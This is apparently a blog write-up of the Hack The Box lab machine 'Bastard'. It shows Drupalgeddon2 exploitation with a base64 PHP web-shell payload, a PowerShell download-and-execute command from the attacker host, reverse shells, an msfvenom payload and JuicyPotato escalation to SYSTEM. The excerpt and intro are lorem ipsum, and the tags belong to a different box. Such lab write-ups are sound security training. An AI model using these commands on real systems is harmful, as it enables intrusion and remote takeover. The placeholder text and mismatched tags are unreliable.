---
layout: single
title: Bastard - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-bastard/bastard_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bastard/bastard_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/bastard]# nmap -Pn -n -sCV 10.10.10.9 --open                                                                       (master✱)
    PORT      STATE SERVICE VERSION
    80/tcp    open  http    Microsoft IIS httpd 7.5
    |_http-generator: Drupal 7 (http://drupal.org)
    | http-methods:
    |_  Potentially risky methods: TRACE
    | http-robots.txt: 36 disallowed entries (15 shown)
    | /includes/ /misc/ /modules/ /profiles/ /scripts/
    | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
    | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
    |_/LICENSE.txt /MAINTAINERS.txt
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Welcome to 10.10.10.9 | 10.10.10.9
    135/tcp   open  msrpc   Microsoft Windows RPC
    49154/tcp open  msrpc   Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  DIRB:


  NIKTO:



2. We can see that the server is running 'Drupal 7', which is very vulnerable. A quick google for 'drupal 7 rce exploit'
   and we find the ruby script drupalgeddon2, download it and exploit.

  [root:/git/htb/bastard]# ./drupalgeddon.rb http://10.10.10.9/                                                                     (master✱)
    [*] --==[::#Drupalggedon2::]==--
    --------------------------------------------------------------------------------
    [i] Target : http://10.10.10.9/
    --------------------------------------------------------------------------------
    [+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
    [+] Drupal!: v7.54
    --------------------------------------------------------------------------------
    [*] Testing: Form   (user/password)
    [+] Result : Form valid
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Clean URLs
    [+] Result : Clean URLs enabled
    --------------------------------------------------------------------------------
    [*] Testing: Code Execution   (Method: name)
    [i] Payload: echo AFLLPNGO
    [+] Result : AFLLPNGO
    [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
    --------------------------------------------------------------------------------
    [*] Testing: Existing file   (http://10.10.10.9/shell.php)
    [i] Response: HTTP 404 // Size: 12
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Writing To Web Root   (./)
    [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
    [!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
    [i] Response: HTTP 404 // Size: 12
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Writing To Web Root   (sites/default/)
    [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
    [!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
    [i] Response: HTTP 404 // Size: 12
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    [*] Testing: Writing To Web Root   (sites/default/files/)
    [*] Moving : ./sites/default/files/.htaccess
    [i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
    [!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
    [!] FAILED : Couldn't find a writeable web path
    --------------------------------------------------------------------------------
    [*] Dropping back to direct OS commands
  drupalgeddon2>> whoami
    nt authority\iusr
  drupalgeddon2>> type C:\Users\dimitris\Desktop\user.txt
    ba22fde1932d06eb76a163d312f921a2


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Get a better shell, upgrade to Powershell.

  drupalgeddon2>> powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/ps-rev.ps1')

  [root:/srv/pub-share]# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.9 - - [02/Mar/2021 14:56:38] "GET /ps-rev.ps1 HTTP/1.1" 200 -

  root@nidus:/git/htb/bastard# rlwrap nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 50223
    PS C:\inetpub\drupal-7.54> whoami
      nt authority\iusr


2. Check your privs, and if it's possible to abuse them.

  PS C:\inetpub\drupal-7.54> whoami /all
    --- snip ---
    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name          Description                               State
    ======================= ========================================= =======
    SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
    SeImpersonatePrivilege  Impersonate a client after authentication Enabled
    SeCreateGlobalPrivilege Create global objects                     Enabled

'SeImpersonatePrivilege' is always interesting, this often mean we can get SYSTEM using JuicyPotato.


3. Juice up the potato!

Create a payload and put it on SMB Share:
  [root:/git/htb/bastard]# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 > bastard-privesc.bat                (master✱)
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: cmd from the payload
    No encoder specified, outputting raw payload
    Payload size: 1583 bytes
  [root:/git/htb/bastard]# cp bastard-privesc.bat /srv/pub-share

Check system OS:
  PS C:\inetpub\drupal-7.54> systeminfo
    --- snip ---
    OS Name:                   Microsoft Windows Server 2008 R2 Datacenter

Upload JuicyPotato, grab a random CLSID (from JuicyPotato's GitHub) and exploit:
  C:\tmp> copy \\10.10.14.8\pub-share\JuicyPotato.exe .
  C:\tmp> JuicyPotato.exe -l 1444 -p c:\Windows\System32\cmd.exe -a "/c \\10.10.14.8\pub-share\bastard-privesc.bat" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}

The command doesn't provide any output, feel like something is wrong with the PS session. Try directly from drupalgeddon instead.

  drupalgeddon2>> C:\tmp\JuicyPotato.exe -l 1444 -p c:\Windows\System32\cmd.exe -a "/c \\10.10.14.8\pub-share\bastard-privesc.bat" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
    Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1444
    ....
    [+] authresult 0
    {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

    [+] CreateProcessWithTokenW OK

  [root:/srv/pub-share]# nc -lvnp 4499
    listening on [any] 4499 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 50541
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Windows\system32>whoami
      nt authority\system

    C:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt.txt
      4bf12b963da1b30cc93496f617f7ba7c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


drupalgeddon2:
  https://github.com/dreadlocked/Drupalgeddon2

JuicyPotato:
  https://github.com/ohpe/juicy-potato

CLSIDs Windows 2008 R2:
  https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
